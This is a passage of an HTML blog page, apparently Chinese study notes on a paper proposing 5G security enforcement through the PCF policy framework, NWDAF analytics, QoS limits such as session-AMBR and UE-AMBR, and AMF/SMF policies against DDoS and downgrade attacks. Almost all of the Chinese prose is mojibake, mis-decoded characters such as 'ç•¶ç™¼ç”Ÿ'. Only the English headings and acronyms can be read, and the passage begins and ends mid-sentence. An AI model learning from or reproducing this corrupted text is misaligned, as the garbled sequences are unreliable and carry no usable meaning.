Indicator)<br>ç•¶ç™¼ç”Ÿäº†PDUå±¤ç´šçš„å®‰å…¨äº‹ä»¶ï¼Œä¸¦æ²’æœ‰è§¸ç™¼ç·©è§£æªæ–½çš„å®‰å…¨å±¬æ€§<br>ä¾‹å¦‚ï¼Œç•¶æ‡‰ç”¨ç¨‹å¼è™•ç†è¢«æ­¸é¡ç‚ºæ©Ÿå¯†çš„è³‡æ–™æ™‚åœ¨UEèˆ‡Data Networkä¹‹é–“çš„PDU Sessionå…§æœƒéœ€è¦ç‰¹åˆ¥çš„å®‰å…¨æªæ–½ï¼Œåƒæ˜¯DRBæ‰€æ”¯æ´æœå‹™ä¸­æ‰€ä½¿ç”¨çš„å¼·åŠ å¯†æ¼”ç®—æ³•æˆ–æ›´é•·çš„åŠ å¯†é‡‘é‘°</p><blockquote><p>åœ¨ 3.25ç« ç¯€é–‹ç™¼äº†ä¸€å€‹æ¡†æ¶ï¼Œç‚ºPDUå±¤ç´šçš„å®‰å…¨äº‹ä»¶æä¾›å®‰å…¨å±¬æ€§</p></blockquote><h3 id="2-3-Challenges-to-fine-security-policies-under-policy-control-framework"><a href="#2-3-Challenges-to-fine-security-policies-under-policy-control-framework" class="headerlink" title="2.3 Challenges to fine security policies under policy control framework"></a>2.3 Challenges to fine security policies under policy control framework</h3><p>é›–ç„¶ç‚ºæ¯å€‹è¨‚é–±å®šç¾©å®‰å…¨ç­–ç•¥å¾ˆè²»åŠ›ï¼Œä½†é€™èˆ‡ç‚ºQoSé€²è¡Œæ­¤æ“ä½œä¼¼ä¹æ²’ç”šéº¼ä¸åŒ<br>å¯ä»¥é æœŸï¼Œå®‰å…¨ç­–ç•¥èˆ‡QoSæ¸¬ä¸¦éçœŸæ­£ç¨ç«‹ï¼Œè€Œæ˜¯ç›¸åŒç­–ç•¥å¯è¢«æ‡‰ç”¨åœ¨å¤§é‡è¨‚é–± e.g.per slice</p><p><strong>Policy and Charging Control rule (PCC rule)</strong> åŒ…å«å•Ÿç”¨ç”¨æˆ¶é¢åµæ¸¬ã€ç­–ç•¥æ§åˆ¶ã€å°æ–¼æœå‹™è³‡æ–™æµçš„é©ç•¶è¨ˆè²»æ‰€éœ€çš„è³‡è¨Š</p><p>å…©ç¨®PCC ruleså­˜åœ¨:å‹•æ…‹èˆ‡é å®šç¾©è¦å‰‡<br>å‹•æ…‹è¦å‰‡ç”±PCFæä¾›çµ¦SMFï¼Œè€Œé å®šç¾©PCCè¦å‰‡å‰‡æ˜¯è¢«è¨­å®šè‡³SMF</p><p>ç•¶å‹•æ…‹è¦å‰‡èˆ‡é å…ˆå®šç¾©çš„PCCè¦å‰‡æœ‰ç›¸åŒå„ªå…ˆç´šï¼Œå‰‡å‹•æ…‹è¦å‰‡å„ªå…ˆ<br>é€™äº›policiesçš„ç›®æ¨™æ˜¯:</p><ul><li>PDU sessions</li><li>Service Data Flows (SDF). Set of PDUs (within PDU session) identidied by traffic filters</li></ul><p>PCF Controlæ˜¯å¦æ‡‰ç”¨æ–¼PDU Sessionæ˜¯ç”±SMFç­–ç•¥åŸºæ–¼DNNæˆ–æ¯å€‹åˆ‡ç‰‡å»å®šç¾©çš„<br>è‹¥æ²’æœ‰PCF Cnotrolï¼Œå‰‡æœ¬åœ°åŸºæ–¼ç­–ç•¥çš„ruleæœƒåœ¨SMFè¢«è¨­å®š</p><p>PCC rule å®šç¾©åŒ…å«:</p><ul><li>Sevice data flow detection mechanism  (ex. filters, application template)</li><li>Charging releated Information Elements(IEs) </li><li>Policy control related IEs  (ex. Gating, QoS, bit ratesâ€¦etc)</li></ul><p>service data flow filter åŒ…å«ç”¨æ–¼åŒ¹é…IP PDUæµé‡ä»¥åŠEthernet PDUæµé‡çš„ç”¨æˆ¶å¹³é¢è³‡æ–™<br>SMFæ‡‰ç”¨å•Ÿç”¨çš„PCCè¦å‰‡å…§çš„Service data flow template informationä¾†æŒ‡ç¤ºUPFå»è­˜åˆ¥å±¬æ–¼ç‰¹å®š<br>service flowçš„å°åŒ…</p><p><span class="special">ä½œç‚ºä¸€å€‹PCCè¦å‰‡ä¸€éƒ¨åˆ†çš„å®‰å…¨è³‡è¨Šå…ƒç´ çš„é©ç•¶å®šç¾©æœƒæ˜¯ä¸€å€‹é—œéµæŒ‘æˆ°</span></p><p>ç›®å‰ <strong>3GPP TS 23.503: Technical Specification Policy and Charging Control Frameworkfor the 5G System</strong> æ‰€å®šç¾©çš„PCC Rulesä¸æ˜ç¢ºåŒ…å«æ­¤é¡åƒæ•¸ï¼Œä¹Ÿä¸ä½œç‚ºèƒ½å¤ è­˜åˆ¥å®‰å…¨äº‹ä»¶çš„æœå‹™è³‡æ–™æµåµæ¸¬çš„ä¸€éƒ¨åˆ†ï¼Œæˆ–è€…åšç‚ºç­–ç•¥æ§åˆ¶æ“ä½œçš„ä¸€éƒ¨åˆ†ã€‚ æ­¤å¤–ï¼ŒSMFç™¼é€æœ‰é—œPDU Sessionç‹€æ…‹(e.g. å­˜å–é¡å‹ã€æ¼«éŠã€IPä½å€ç­‰ç­‰)çš„PCFè³‡è¨Šï¼Œå› æ­¤PCFå¯ä»¥åŸºæ–¼ç‰¹å®šè§¸ç™¼å™¨åšå‡ºå‹•æ…‹åæ‡‰å¾è€Œç›¸æ‡‰è®Šæ›´ç­–ç•¥ï¼Œæ‰€ä»¥å®‰å…¨è§¸ç™¼å™¨çš„å®šç¾©éå¸¸é‡è¦ï¼Œå› ç‚ºå®ƒä¸åƒ…æœƒå½±éŸ¿ç¶²çµ¡çš„å®‰å…¨ç‹€æ…‹ï¼Œé‚„æœƒå½±éŸ¿ç¶²çµ¡çš„æ•´é«” QoS å’Œ SLAï¼ˆä¾‹å¦‚ DDoS æ”»æ“Šï¼‰ï¼Œç„¶è€Œå»å‰µé€ é€™äº›å®‰å…¨è§¸ç™¼å™¨(ä¾‹å¦‚ï¼Œæœ€è¿‘ç™¼ç¾çš„å®‰å…¨æ¼æ´ã€è©æ¬ºã€æ”»æ“Šã€é•è¦å­˜å–ç­‰ç­‰)æœƒæ˜¯æŒ‘æˆ°ï¼Œåœ¨UPFæˆ–å…¶ä»–ç‰¹å®šå®‰å…¨æ¢æ¸¬å™¨(security probe)ä¸­è¨­å®šä¸€éƒ¨åˆ†åµæ¸¬éæ¿¾å™¨(detection filter)ï¼Œå…¶ç­–ç•¥ç›®æ¨™æ˜¯å°‡å®‰å…¨ä¿è­‰(security assurance)å±¤é¢åŒ…å«é€²ç¶²è·¯æ•´é«”çš„æœå‹™ä¿è­‰ä¸­ã€‚</p><p><span class="special">âš ï¸ç›®å‰å•é¡Œå‰‡æ˜¯ï¼Œå¦‚ä½•ä½¿å®‰å…¨æ€§æˆç‚º PCF çš„ PCC æ±ºç­–éç¨‹çš„ä¸€éƒ¨åˆ†ï¼Ÿ</span><br>æœ¬ç¯‡è«–æ–‡åœ¨3.3ç« ç¯€æä¾›è§£ç­”</p><h3 id="2-4-Challenges-to-introduce-security-use-cases-under-network-analytics"><a href="#2-4-Challenges-to-introduce-security-use-cases-under-network-analytics" class="headerlink" title="2.4 Challenges to introduce security use cases under network analytics"></a>2.4 Challenges to introduce security use cases under network analytics</h3><p><strong>Network Data Analytics function (NWADF)</strong> ä½œç‚ºSBAæ¶æ§‹å‡ºç¾åœ¨Release 15</p><p>å¯ä»¥æœ‰å¤šå€‹å°ˆé–€ç”¨æ–¼ä¸åŒé¡å‹åˆ†æçš„ NWDAFï¼Œç”±åˆ†æ ID è¨Šæ¯å…ƒç´  (IE) æ¨™è­˜ã€‚æ­¤ IE ç”¨æ–¼è­˜åˆ¥ NWDAF å¯ä»¥ç”Ÿæˆçš„å—æ”¯æŒåˆ†æçš„é¡å‹ã€‚ NWDAF å‡ºæ–¼ä¸åŒç›®çš„èˆ‡ä¸åŒå¯¦é«”é€²è¡Œäº¤äº’ï¼Œä¾‹å¦‚åŸºæ–¼è¨‚é–±ä¸åŒç¶²çµ¡åŠŸèƒ½æä¾›çš„äº‹ä»¶çš„æ•¸æ“šæ”¶é›†ã€å¾æ•¸æ“šå­˜å„²åº«å’Œ NF æª¢ç´¢è¨Šæ¯ï¼Œä»¥åŠå‘ä¸åŒé¡å‹çš„æ¶ˆè²»è€…æŒ‰éœ€æä¾›åˆ†æï¼Œç›®å‰NWADFçš„è³‡æ–™è’é›†åŠŸèƒ½åƒ…å…è¨±å¾æ§åˆ¶å¹³é¢ä¾†æºç‚ºåˆ‡ç‰‡æˆ–UEç²å–è³‡æ–™ï¼Œä½†ç›®å‰å¦‚ä½•å¾UPFè’é›†æœ‰é—œç”¨æˆ¶å¹³é¢å®‰å…¨è³‡æ–™å°šæœªæ¨™æº–åŒ–ï¼Œé€™å¯¦éš›ä¸Šç›®å‰åƒ…é™æ–¼æµé‡å’Œæ•¸æ“šé€Ÿç‡ã€‚</p><p><strong>OAM(Operation,Administration and Management)</strong> ç³»çµ±åƒ…æ¸¬é‡èˆ‡è¿½è¹¤è³‡æ–™ï¼Œé€™äº›è³‡æ–™å¯é€šéManagement Service å…±äº«çµ¦NWADF</p><p>å‡ºæ–¼å®‰å…¨åˆ†æç›®çš„ï¼Œå¾ç”¨æˆ¶å¹³é¢æµé‡åˆ†æä¸­æ”¶é›†çš„æœ‰é—œæƒ¡æ„è»Ÿé«”ã€æ®­å±ç¶²çµ¡ã€å”å®šç•°å¸¸ç­‰çš„è³‡è¨Šï¼Œä¾‹å¦‚é€šé [18] æå‡ºçš„å®‰å…¨æ¢æ¸¬å™¨ï¼ˆä¾‹å¦‚åµŒå…¥ UPF ä¸­çš„ IDSï¼‰æˆ–æƒ¡æ„è»Ÿä»¶æ²™ç®±ï¼Œå°‡éå¸¸æœ‰ç”¨é€šéæ–°çš„å®‰å…¨ç”¨ä¾‹å¢å¼·ç¶²çµ¡åˆ†æã€‚</p><p>é€™äº›åˆ†æè³‡è¨Šç’°ç¹ç¶²è·¯åˆ‡ç‰‡çš„è² è¼‰æ°´å¹³ã€æœå‹™é«”é©—ã€ç¶²è·¯æ•ˆèƒ½ã€ç§»å‹•æ€§ã€QoSã€UEè¡Œç‚ºç­‰ç­‰<br>æä¾›äº†æœ‰åƒ¹å€¼çš„çŸ¥è­˜åŸºç¤</p><p>æœ¬æ–‡ç¯„åœä¸­æœ‰ä¸‰å€‹åŸºæœ¬å•é¡Œè¢«æå‡º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- å¦‚ä½•å¾æ‰€åˆ†æçŸ¥è­˜çš„åŸºç¤ä¸Šå–å¾—å®‰å…¨æ€§ç›¸é—œçš„è³‡è¨Š?</span><br><span class="line">- åœ¨NWADFä¸­å¯ç›£æ§å’Œé€²ä¸€æ­¥åˆ†æå“ªäº›ç‰¹å®šçš„æ–°å®‰å…¨åƒæ•¸?</span><br><span class="line">- åœ¨end to end 5Gæ¶æ§‹ä¸­PCFï¼Œè¦å¦‚ä½•åˆ©ç”¨é€™äº›è³‡è¨Šä¾†è¨­å®šä¸¦åŸ·è¡Œå®‰å…¨ç­–ç•¥?</span><br></pre></td></tr></table></figure><h2 id="3-Proposed-approach-to-security-enforcement-in-5G"><a href="#3-Proposed-approach-to-security-enforcement-in-5G" class="headerlink" title="3. Proposed approach to security enforcement in 5G"></a>3. Proposed approach to security enforcement in 5G</h2><p>å¾å¯¦æ–½è§’åº¦ä¾†çœ‹ï¼Œåˆ°ç›®å‰ç‚ºæ­¢ï¼Œè¡Œå‹•ç¶²çµ¡ä¸­å®‰å…¨ç­–ç•¥å’Œ QoS åƒæ•¸çš„å¯¦ç¾åœ¨ç¶²çµ¡ä¸­å­˜åœ¨å¾ˆå¤§å·®ç•°</p><p>5G PCFæ˜¯ä¸€å€‹å–®ä¸€æ¡†æ¶ç”¨ä¾†å®šç¾©ä»»ä½•é¡å‹çš„ç­–ç•¥ä¸¦å°‡å…¶éäº¤çµ¦å…¶ä»–æ§åˆ¶å¹³é¢ä¸Šçš„NF</p><p>å¾ä¸ä¹…çš„å°‡ä¾†è§’åº¦ä¾†çœ‹ï¼Œç•¶ç§Ÿæˆ¶è¦æ±‚çš„è¨‚é–±è¨ˆç•«(Subscription Plan)å°‡éœ€è¦åŒ…å«å®‰å…¨æ¢æ¬¾æ™‚ï¼Œå³å®‰å…¨æ€§ä½œç‚ºSLAçš„é‡è¦çµ„æˆéƒ¨åˆ†ï¼Œå°±åƒç•¶ä»Šçš„QoSä¸€æ¨£ï¼Œæˆ‘å€‘æå‡ºäº†æ–°çš„security enforcementæ–¹å¼åˆ©ç”¨äº†çµ±ä¸€ç­–ç•¥æ§åˆ¶æ¨¡å‹</p><h3 id="3-1-Application-of-QoS-policies-to-security-use-cases"><a href="#3-1-Application-of-QoS-policies-to-security-use-cases" class="headerlink" title="3.1 Application of QoS policies to security use cases"></a>3.1 Application of QoS policies to security use cases</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- session-AMBR</span><br><span class="line">- UE-AMBR</span><br></pre></td></tr></table></figure><p>æˆ‘å€‘çš„ææ¡ˆæ˜¯ï¼Œé€™äº› QoS ç­–ç•¥å¯ä»¥åœ¨æ¥æ”¶å®‰å…¨äº‹ä»¶æˆ–äº‹ä»¶æ™‚å¾ PCF å—é™åˆ¶åœ°å’Œå‹•æ…‹åœ°æ‡‰ç”¨åˆ°ç¶²çµ¡ä¸­ï¼Œé€™äº›å®‰å…¨äº‹ä»¶å¯ä»¥åœ¨ NWDAF æˆ–ç”¨æˆ¶å¹³é¢çš„å…¶ä»–å®‰å…¨åˆ†æå¹³å°ï¼ˆä¾‹å¦‚ï¼Œæ”¾ç½®åœ¨ç®¡ç†å¹³é¢ä¸­çš„ SIEM å·¥å…·ï¼ŒåµŒå…¥åœ¨ UPF ä¸­çš„ IDS ç³»çµ±ç­‰ï¼‰ä¸­å»ºç«‹</p><p>åŸºæ–¼é å®šç¾©çš„å®‰å…¨æŒ‡æ¨™ï¼Œå¯ä»¥å¾ PCF åŸ·è¡Œä¸åŒçš„ç­–ç•¥ï¼Œå¯¦éš›ä¸Šä½œç‚ºç¶²çµ¡ä¸­çš„æœ‰æ•ˆç·©è§£æ©Ÿåˆ¶ï¼š</p><ul><li>è¨­å®šæ–°çš„session AMBR</li><li>è¨­å®šæ–°çš„UE AMBRï¼Œé€™å°‡æœƒæ˜¯ä¸€ç¨®å°æ–¼UEçš„éš”é›¢ (ä¾‹å¦‚ï¼ŒUEæ˜¯ä½œç‚ºDDoSæ”»æ“Šçš„active bot)</li><li>åœ¨QoS Profileå…§ä½¿ç”¨æ›´åš´æ ¼çš„å®‰å…¨æ§åˆ¶ä»¥è¨­å®šæ–°çš„PDU Session</li></ul><p>QoS profiles å¯åœ¨5G ANä¸­ç”±SMFå‹•æ…‹å»ºç«‹ï¼›å¯ä»¥é€éä¾†è‡ªSMFçš„N1ä»‹é¢ä¸Šçš„æœƒè©±ç®¡ç†ä¿¡ä»¤æˆ–ç›´æ¥åœ¨N4ä»‹é¢ä¸Šçš„UPFä¸Šå°UEå¯¦æ–½ç‰¹å®šçš„QoSè¦å‰‡</p><p>N1ä»‹é¢: UE $\leftrightarrow$ AMF<br>N4ä»‹é¢: SMF $\leftrightarrow$ UPF ç”¨ä»¥åœ¨ç”¨æˆ¶å¹³é¢ä¸­ç®¡ç†è³‡æ–™æœƒè©±<br>N4åŸºæ–¼PFCPå”å®š(Packet Forwarding Control Protocol)</p><p>SMF ç¢ºå¯¦é€šéè¦å‰‡ç®¡ç† QoS æµï¼Œå°‡æµé‡éæ¿¾å™¨èˆ‡ä¾†è‡ª PCF çš„ QoS ç­–ç•¥ç›¸é—œè¯ã€‚<br>æµé‡éæ¿¾å™¨é›†åœ¨ UPF ä¸­é…ç½®ï¼Œå¯ç”¨æ–¼è¼•é¬†ç®¡ç†å®‰å…¨æœå‹™ã€‚ä¾‹å¦‚ï¼š</p><ul><li>ç”±å…·æœ‰ç‰¹æ®Šå®‰å…¨è¦æ±‚ï¼ˆä¾‹å¦‚åŠ å¯†æ¼”ç®—æ³•ã€å¯†é‘°é•·åº¦ç­‰ï¼‰çš„ç‰¹å®šä¸€çµ„UEæˆ–åˆ‡ç‰‡çš„ç‰¹å®šå®‰å…¨åƒæ•¸indexæ¨™è­˜å‡ºçš„å®‰å…¨é—œè¯</li><li>åƒæ˜¯äº¤é€šæ§åˆ¶ä¹‹é¡çš„åµæ¸¬èˆ‡å‹•æ…‹QoS è¦å‰‡å¯ä»¥è¢«å‹•æ…‹æ‡‰ç”¨</li></ul><p>ä¸‹é¢æµç¨‹åœ–æç¹ªäº†æ‡‰ç”¨å®‰å…¨è¦å‰‡ä½œç‚ºåœ¨ç¶²è·¯ä¸­QoSç­–ç•¥çš„ä¸€éƒ¨åˆ†æ¦‚å¿µ:<br><img src="https://i.imgur.com/3514RyB.png"></p><p>ä¸‹åœ–ç‚ºé€éä»¥ä¸Šæ¦‚å¿µå¯¦ç¾çš„å®‰å…¨å‘¼å«æ­¥é©Ÿ<br><img src="https://i.imgur.com/1t07hXz.png"></p><p><em>1.a</em> <span class="special"><strong>NWDAF â†’ PCF</strong></span><br>PCFè¨‚é–±äº†NWDAFé€šçŸ¥<br>ç”±æ–¼ç¶²è·¯å®‰å…¨äº‹ä»¶(ex. DDoS)ï¼Œæˆ‘å€‘ç™¼ç¾äº†ä½¿ç”¨è€…è³‡æ–™æ“å¡çš„æƒ…æ³ï¼Œè©²æƒ…æ³é€éN23ä»‹é¢å‚³é€çµ¦äº†PCF</p><p><em>1.b</em> <span class="special"><strong>Security Management â†’ PCF</strong></span><br>å®‰å…¨ç®¡ç†ç³»çµ±é€šéREST APIèˆ‡PCFæ•´åˆè€Œæˆ<br>å®‰å…¨äº‹ä»¶è¢«å ±å‘Šçµ¦PCF</p><p><em>1.c</em> <span class="special"><strong>PCF â†’ UDR(optional)</strong></span><br>PCFè—‰ç”±N36ä»‹é¢å‘UDRè«‹æ±‚ä¸€çµ„è³‡æ–™<br>åœ¨æ­¤ç”¨ä¾‹ä¸­ï¼Œè«‹æ±‚è³‡æ–™å¯ä»¥æ˜¯è¨‚é–±ç­–ç•¥é›†çš„å®‰å…¨ç­–ç•¥éƒ¨åˆ†çš„IDï¼Œä»¥åœ¨ç™¼ç”Ÿå®‰å…¨äº‹ä»¶æ™‚æ‡‰ç”¨ã€‚</p><p><em>2.</em> <span class="special"><strong>PCF â†’ SMF</strong></span><br>ç•¶PCFåšå‡ºç­–ç•¥æ±ºå®šå¾Œï¼ŒPCFå‰‡ç¢ºå®šSMFéœ€è¦æ›´æ–°ç­–ç•¥è³‡è¨Šä»¥ç·©è§£å®‰å…¨å•é¡Œï¼Œä¸¦è—‰ç”±N7ä»‹é¢ç™¼é€ä¸€å€‹<br><strong>Npcf_SMPolicyControl_UpdateNotify</strong> è«‹æ±‚å…¶ä¸­åŒ…å«é—œæ–¼PDU Sessionçš„æ›´æ–°ç­–ç•¥è³‡è¨Šï¼Œåœ¨é€™ç¨®æƒ…æ³ä¸‹å»ºç«‹æ–°çš„ Session AMBR</p><p><em>3.</em> <span class="special"><strong>SMF â†’ PCF</strong></span><br>SMFå›æ‡‰PCFä¸€å€‹ACK</p><p><em>4.a</em> <span class="special"><strong>SMF â†’ UPF</strong></span><br>åŸºæ–¼SMFæ‰€ç™¼é€çš„QoS Emforcement Ruleçš„QoS enforcementæ˜¯ä¸€å€‹ç”±UPFæä¾›çš„åŠŸèƒ½<br>åŒ…å«é€šéN4ä»‹é¢å°Session AMBR (Step2 å¾SMFæ¥æ”¶ä¾†è‡ªPCF)</p><p><em>4.b</em> <span class="special"><strong>SMF â†’ UE</strong></span><br>è—‰ç”±AMFèˆ‡UEäº¤æ›N1 SMä¿¡ä»¤ï¼Œä¾†æä¾›UE QoSè¦å‰‡<br>e.g. è¨­å®šæ–°çš„UE-AMBR ä¾†é™åˆ¶åœ¨UEæ‰€æœ‰PDU Sessionä¸­æ‰€æœ‰Non-GBR QoS Flowæ‰€è¢«é æœŸå¯æä¾›çš„æœ€é«˜Bit rate</p><p><em>4.c</em>  <span class="special"><strong>SMF â†’ 5G AN</strong></span><br>è—‰ç”±AMFèˆ‡5G-RANäº¤æ›N2 SMä¿¡ä»¤ï¼Œä»¥è¨­å®š5G RANçš„QoSåƒæ•¸<br>e.g. ç‚ºç‰¹å®šé¡å‹çš„æµé‡é ç•™è³‡æº</p><h3 id="3-2-User-plane-security-enforcement-and-assurance"><a href="#3-2-User-plane-security-enforcement-and-assurance" class="headerlink" title="3.2. User plane security enforcement and assurance"></a>3.2. User plane security enforcement and assurance</h3><p>åœ¨UP æµé‡ä¸Šå¯¦ç¾å®‰å…¨ç­–ç•¥çš„æ–¹å¼æ˜¯ä¸€æ¨£æ˜¯åŸºæ–¼ç­–ç•¥æ§åˆ¶</p><p>ç›´æ¥ä½œç”¨æ–¼AMFã€SMFç­‰æ§åˆ¶NFï¼Œè€ŒPCFæ‡‰åˆ°é”UEã€RANå’ŒUPFä»¥ç›´æ¥åœ¨UPä¸Šæ‡‰ç”¨é€™äº›ç­–ç•¥</p><h4 id="3-2-1-Security-policies-enforcement-via-AMF"><a href="#3-2-1-Security-policies-enforcement-via-AMF" class="headerlink" title="3.2.1. Security policies enforcement via AMF"></a>3.2.1. Security policies enforcement via AMF</h4><p><img src="https://i.imgur.com/MfoI2Au.png"></p><p>æœ‰å…©ç¨®é¡åˆ¥çš„ç­–ç•¥æ˜¯ç‚ºäº†<strong>å­˜å–</strong>èˆ‡<strong>ç§»å‹•æ€§ç®¡ç†</strong><br>å®ƒå€‘è¢«AMFåŸ·è¡Œã€ç”±PCFè¦å®šä¸¦å„²å­˜åœ¨UDRä¸­<br>å®ƒå€‘å¯ä»¥æ”¯æŒå®‰å…¨ç”¨ä¾‹ï¼Œè€Œç„¡éœ€å°ç­–ç•¥å®šç¾©é€²è¡Œé‡å¤§æ›´æ”¹ï¼š</p><ul><li><p>Policies transfered from PCF to AMF:</p><ul><li>Service area restrications<br>  <strong>Tracking Area</strong> æ˜¯ä¸€ç¨®å€åŸŸä¸Šçš„é‚è¼¯æ¦‚å¿µï¼Œä½¿ç”¨è€…å¯åœ¨å…¶ä¸­ç§»å‹•è€Œç„¡é ˆæ›´æ–°ç®¡ç†ç¯€é»ï¼Œç¶²è·¯æœƒåˆ†é…ä¸€å€‹æˆ–å¤šå€‹TAsåˆ°ä½¿ç”¨è€…ä¸Š<br>  è€ŒService area restricationåŒ…å«<strong>å…è¨±å€åŸŸ</strong>èˆ‡<strong>éå…è¨±å€åŸŸ</strong><br>  æœ¬ç¯‡è«–æ–‡æå‡ºï¼Œä½¿ç”¨ç‰¹å®šé–¥å€¼ç‚ºä¸åŒæœå‹™å€åŸŸå»ºç«‹å®‰å…¨ç­‰ç´šï¼Œä¾†æ±ºå®šä½¿ç”¨è€…æ˜¯å¦æœ‰æ¬Šç§»å‹•åˆ°é«˜å®‰å…¨æœå‹™å€åŸŸ<br>  èˆ‰ä¾‹: åœ°ç†ä¸Šçš„æ•æ„Ÿåœ°å€ï¼Œåƒæ˜¯é—œéµåŸºç¤è¨­æ–½å¯èƒ½æœƒé™åˆ¶å°ä½¿ç”¨ <strong>â€œNull Schemaâ€</strong> ä¾†ç”¢ç”ŸSUCIçš„ä½¿ç”¨è€…çš„å­˜å–ï¼Œä»¥é˜²æ­¢åƒæ˜¯æƒ¡æ„åŸºåœ°å°çš„å½±éŸ¿ï¼Œæ›å¥è©±èªªå¯èƒ½æœƒå…è¨±æ”¯æ´UPå®Œæ•´æ€§ä¿è­·çš„ä½¿ç”¨è€…å­˜å–<br>  <img src="https://i.imgur.com/EXWGDgX.png"></li><li>Priorities of area types the user may use<br>  é©ç•¶çš„å„ªå…ˆæ¬Šå®šç¾©å¯é¿å…<strong>é™ç´šæ”»æ“Š</strong>ï¼Œè¿«ä½¿UEé€£æ¥åˆ°æ›´å¤šè„†å¼±æ€§çš„ç¶²è·¯(åƒæ˜¯2G)ï¼Œæ¯”èµ·4Gã€5Gç¶²è·¯ä¾†èªªæ›´å®¹æ˜“é­å—æ”»æ“Šï¼Œæ”»æ“Šè€…å¯ä»¥é€šéä½¿ UE å’Œç¶²çµ¡å¯¦é«”åˆ†åˆ¥ç›¸ä¿¡å°æ–¹ä¸æ”¯æŒå®‰å…¨åŠŸèƒ½ä¾†å˜—è©¦é™ç´šæ”»æ“Šï¼Œå³ä½¿é›™æ–¹å¯¦éš›ä¸Šéƒ½æ”¯æŒè©²å®‰å…¨åŠŸèƒ½<br>  <img src="https://i.imgur.com/8nbzQWr.png"><br>  <strong>Anti-Bidding down Architecture</strong> åœ¨Release 15ä¸­å·²ç¶“å®šç¾©ï¼Œä½†ç›®å‰ä¸¦ç‚ºçœŸæ­£ç”Ÿæ•ˆï¼Œå› ç‚ºå®ƒçš„ç›®çš„æ˜¯åœ¨æ–¼é˜²æ­¢å¾æœªä¾†çš„å¢å¼·å®‰å…¨åŠŸèƒ½é™ä½åˆ°ç•¶å‰çš„å®‰å…¨åŠŸèƒ½<br>  <img src="https://i.imgur.com/PC8zo8N.png"></li></ul></li><li><p>Policies transferred from PCF to the UE via AMF</p><ul><li>User Equipment Route Selection Policy to determine how to route egress traffic(PDU selection policies)<br>  ç•¶å®‰å…¨äº‹ä»¶ç™¼ç”Ÿæ™‚å¯èƒ½æœƒè§¸ç™¼æ–°çš„PDU Session(e.g. åœ¨UEä¸­çš„æƒ¡æ„ç¨‹å¼åµæ¸¬)i.e.<br>  ä¸€ç¨®åœ¨data pathä¸Šå…·æœ‰ç‰¹æ®Šç­–ç•¥çš„<strong>éš”é›¢</strong> PDUï¼Œç”šè‡³æ˜¯åœ¨å…·æœ‰ç‰¹æ®Šå®‰å…¨æœå‹™çš„å®‰å…¨DNä¸­çµ‚æ­¢çš„PDU</li></ul></li></ul><p><span class="special">LADN(Local Area Data Network)çš„æ¦‚å¿µåœ¨5Gä¸­ç”¨æ–¼æ”¯æ´MECï¼Œä¸¦æ”¯æ´ä¸Šè¿°æªæ–½çš„å¯¦è¸ã€‚LADNå°åƒ…æˆæ¬Šåœ¨æŸä¸€çµ„ä½ç½®(è¢«ç¨±ç‚º<strong>LADN Services Areas</strong>)ä¸­çš„PDU Sessionä¸­å¯¦æ–½é™åˆ¶ã€‚</span></p><p><span class="special">LADN services Areas åœ¨AMFä¸­åŸºæ–¼æ¯å€‹DNNå»é€²è¡Œè¨­å®šï¼Œè€ŒAMFæœƒæä¾›UE LADN Service Areasçš„è³‡è¨Š</span></p><h4 id="3-2-2-Security-policies-enforcement-via-SMF"><a href="#3-2-2-Security-policies-enforcement-via-SMF" class="headerlink" title="3.2.2. Security policies enforcement via SMF"></a>3.2.2. Security policies enforcement via SMF</h4><blockquote><p>SMF åŠŸèƒ½ä»‹ç´¹ : SMFè² è²¬æ§åˆ¶ä¸€å€‹PDU Sessionæ‰€éœ€çš„ä¿¡ä»¤(é€šéN4ä¿¡ä»¤)ï¼Œä¸¦è¨­å®šé€™å€‹PDU Sessionä¸­çš„ç”¨æˆ¶å¹³é¢è™•ç†(æ”¯æ´PDU Sessionçš„ç”¨æˆ¶å¹³é¢åŠŸèƒ½(UPF)çš„é¸æ“‡)</p></blockquote><p>å› æ­¤SMFæ§åˆ¶äº†UPFæ‰€æ”¯æ´çš„åŠŸèƒ½ï¼ŒåŒ…å«å®‰å…¨ç›¸é—œçš„åŠŸèƒ½åƒæ˜¯ï¼Œé˜²ç«ç‰†ã€ç¯€çœæµé‡ã€DDoSä¿è­·ã€GPRS Tunneling Protocol(GTP)ã€(æ–°çš„Inter PLMN UP Security in Release16)ç­‰ç­‰åŠŸèƒ½</p><p>æ­¤å¤–å®ƒé‚„æ§åˆ¶ç­–ç•¥åŸ·è¡Œ(policies enforcement)ï¼Œå³èˆ‡PCFäº’å‹•ä¾†ç²å¾—ç­–ç•¥ï¼Œä¸¦å°‡å…¶ç›´æ¥æ‡‰ç”¨åˆ°UPF(via N4)æˆ–è—‰ç”±AMFæ‡‰ç”¨åˆ°NG-RANç¶²è·¯ä¸­çš„å…¶ä»–éƒ¨åˆ†.</p><blockquote><p>Proposal: æè­°æ˜¯è¢«åµŒå…¥åˆ°UPFçš„å®‰å…¨æ§åˆ¶å¯é€šéPCFä¸­çš„å®‰å…¨ç­–ç•¥é€²è¡Œç®¡ç†</p></blockquote><p>æ­¤å¤–ï¼Œé€™å€‹æ–°æ¦‚å¿µå°‡ä½¿air interfaceä¸­çš„ç”¨æˆ¶å¹³é¢å®‰å…¨å¯¦æ–½ç­–ç•¥ï¼ˆæ©Ÿå¯†æ€§å’Œå®Œæ•´æ€§ä¿è­·ï¼‰åœ¨ PCF ä¸­ç®¡ç†ï¼ˆè€Œä¸æ˜¯åƒä»Šå¤©ä¸€æ¨£åœ¨ SMF ä¸­æœ¬åœ°é…ç½®ï¼‰ï¼Œè€Œå®ƒå€‘æ˜¯ä¾†è‡ªUDR(ä½œç‚ºå…·æœ‰é å®šç¾©å®‰å…¨ç­–ç•¥çš„ç­–ç•¥è¨­å®šæ–‡ä»¶çš„å„²å­˜)</p><p>å› æ­¤ï¼Œé€™äº›ç­–ç•¥æ‡‰è¦æ˜¯å°ˆç”¨æ–¼ç”¨æˆ¶å¹³é¢å®‰å…¨çš„Dynamic PCC rulesçš„ä¸€éƒ¨åˆ†ï¼Œä¸¦å¯èƒ½æ“´å±•åˆ°å…¶ä»–çš„domainæˆ–UPä»‹é¢ï¼Œåƒæ˜¯:<br>N6: UPF $\leftrightarrow$ Data Networkï¼Œ åŸºæ–¼IPæˆ–Ethernetå‚³è¼¸<br>N3: UPF 